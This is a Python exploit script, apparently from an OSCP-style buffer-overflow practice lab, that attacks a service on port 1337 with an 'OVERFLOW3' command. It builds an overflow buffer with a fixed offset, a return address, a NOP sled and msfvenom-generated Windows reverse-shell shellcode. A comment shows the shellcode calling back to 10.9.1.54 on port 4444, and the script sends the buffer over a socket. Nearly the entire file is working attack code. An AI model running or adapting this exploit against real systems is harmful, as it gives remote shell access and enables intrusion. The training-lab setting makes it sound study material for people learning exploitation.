import socket,sys

ip = sys.argv[1] if sys.argv[1] else "10.10.11.248"
port = 1337

prefix = b"OVERFLOW3 "
offset = 1274
overflow = b"A" * offset
# 62501203
retn = b"\x03\x12\x50\x62"
padding = b"\x90" * 16

# bad_chars = {0,0x23,0x3c,0x83,0xba}
#msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.54 LPORT=4444 EXITFUNC=thread -b "\x00\x40\x11\xB8\xEE\x5F" -f py -v payload -o shellcode.py
payload =  b""
payload += b"\xfc\xbb\xa5\x04\x09\x82\xeb\x0c\x5e\x56\x31\x1e"
payload += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
payload += b"\xff\x59\xec\x8b\x82\xa1\xed\xeb\x0b\x44\xdc\x2b"
payload += b"\x6f\x0d\x4f\x9c\xfb\x43\x7c\x57\xa9\x77\xf7\x15"
payload += b"\x66\x78\xb0\x90\x50\xb7\x41\x88\xa1\xd6\xc1\xd3"
payload += b"\xf5\x38\xfb\x1b\x08\x39\x3c\x41\xe1\x6b\x95\x0d"
payload += b"\x54\x9b\x92\x58\x65\x10\xe8\x4d\xed\xc5\xb9\x6c"
payload += b"\xdc\x58\xb1\x36\xfe\x5b\x16\x43\xb7\x43\x7b\x6e"
payload += b"\x01\xf8\x4f\x04\x90\x28\x9e\xe5\x3f\x15\x2e\x14"
payload += b"\x41\x52\x89\xc7\x34\xaa\xe9\x7a\x4f\x69\x93\xa0"
payload += b"\xda\x69\x33\x22\x7c\x55\xc5\xe7\x1b\x1e\xc9\x4c"
payload += b"\x6f\x78\xce\x53\xbc\xf3\xea\xd8\x43\xd3\x7a\x9a"
payload += b"\x67\xf7\x27\x78\x09\xae\x8d\x2f\x36\xb0\x6d\x8f"
payload += b"\x92\xbb\x80\xc4\xae\xe6\xcc\x29\x83\x18\x0d\x26"
payload += b"\x94\x6b\x3f\xe9\x0e\xe3\x73\x62\x89\xf4\x74\x59"
payload += b"\x6d\x6a\x8b\x62\x8e\xa3\x48\x36\xde\xdb\x79\x37"
payload += b"\xb5\x1b\x85\xe2\x1a\x4b\x29\x5d\xdb\x3b\x89\x0d"
payload += b"\xb3\x51\x06\x71\xa3\x5a\xcc\x1a\x4e\xa1\x87\x2e"
payload += b"\x86\xa8\x61\x47\x9a\xaa\x9c\xcb\x13\x4c\xf4\xe3"
payload += b"\x75\xc7\x61\x9d\xdf\x93\x10\x62\xca\xde\x13\xe8"
payload += b"\xf9\x1f\xdd\x19\x77\x33\x8a\xe9\xc2\x69\x1d\xf5"
payload += b"\xf8\x05\xc1\x64\x67\xd5\x8c\x94\x30\x82\xd9\x6b"
payload += b"\x49\x46\xf4\xd2\xe3\x74\x05\x82\xcc\x3c\xd2\x77"
payload += b"\xd2\xbd\x97\xcc\xf0\xad\x61\xcc\xbc\x99\x3d\x9b"
payload += b"\x6a\x77\xf8\x75\xdd\x21\x52\x29\xb7\xa5\x23\x01"
payload += b"\x08\xb3\x2b\x4c\xfe\x5b\x9d\x39\x47\x64\x12\xae"
payload += b"\x4f\x1d\x4e\x4e\xaf\xf4\xca\x6e\x52\xdc\x26\x07"
payload += b"\xcb\xb5\x8a\x4a\xec\x60\xc8\x72\x6f\x80\xb1\x80"
payload += b"\x6f\xe1\xb4\xcd\x37\x1a\xc5\x5e\xd2\x1c\x7a\x5e"
payload += b"\xf7\x1c\x7c\xa0\xf8"



postfix = b""
# print('!mona bytearray -b "{}"\n!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 0198FA30'.format("".join([ "\\x%0.2X" % c for c in bad_chars])))
buffer = prefix + overflow + retn + padding + payload + postfix
print("---")
try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
  s.connect((ip, port))
  # print("Sending evil buffer...")
  s.send(buffer + b"\r\n")
  print("Done!")
except Exception as e:
  print(e)
  print("Could not connect.")
